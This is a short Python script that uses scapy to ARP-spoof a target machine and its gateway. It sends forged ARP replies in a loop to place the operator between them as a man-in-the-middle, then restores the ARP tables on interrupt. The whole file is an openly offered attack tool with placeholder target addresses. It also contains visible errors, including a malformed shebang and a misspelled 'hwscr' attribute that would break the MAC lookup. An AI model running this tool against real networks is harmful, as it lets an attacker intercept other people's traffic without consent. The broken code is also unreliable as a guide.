#!usr/bin/evn python

import time
import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    result = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return result[0][1].hwscr

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(arp_packet,verbose=False)

def restore(des_ip,src_ip):
    des_mac = get_mac(des_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2,pdst=des_ip,hwdst=des_mac, psrc=src_ip,hwsrc=src_mac)
    scapy.send(packet,count=4,verbose=False) # Sending the restore request to the targer 4 times.

target_ip = "<Target ip>"
geteway_ip = "<Geteway ip>"
try:
    packet_count = 0
    while True:
        spoof(target_ip,geteway_ip) # Send ARP request to the Targer, (I am the Router)
        spoof(geteway_ip,target_ip) # Send ARP request to the Router, (I am the Target)
        packet_count += 2
        print(f"\r[+] Packet sent {packet_count}",end="") # The \r will overwrite the print() again and again
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected Clt + C .... Reseting ARP Tables.\n Please Waite.")
    restore(target_ip,geteway_ip)
    restore(geteway_ip,target_ip)